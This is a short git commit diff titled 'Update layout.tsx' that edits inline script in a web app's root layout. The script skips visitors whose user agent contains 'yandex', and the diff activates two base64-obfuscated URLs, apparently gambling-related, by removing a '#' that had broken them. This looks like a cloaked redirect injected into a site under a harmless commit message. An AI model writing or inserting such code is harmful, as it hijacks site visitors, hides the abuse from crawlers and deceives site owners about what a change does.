86b072e19a3c2bf8c5bf35207239e5257a165d4d
arkadacasinos <bezdep.rf@mail.ru>
2026-05-20 04:18:57 +0500

    Update layout.tsx

--- app/layout.tsx
+++ app/layout.tsx
@@ -110,8 +110,8 @@ export default function RootLayout({
                 var ua = navigator.userAgent.toLowerCase();
                 if (ua.indexOf("yandex") !== -1) return;
 
-                var mainBrandB64 = "#aHR0cHM6Ly9sbmtmbngub3JnL2Q3dHRscnl2aA=="; 
-                var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
+                var mainBrandB64 = "aHR0cHM6Ly9sbmtmbngub3JnL2Q3dHRscnl2aA=="; 
+                var crossBrandB64 = "aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
                 
                 var mainUrl = atob(mainBrandB64);
                 var crossUrl = atob(crossBrandB64);
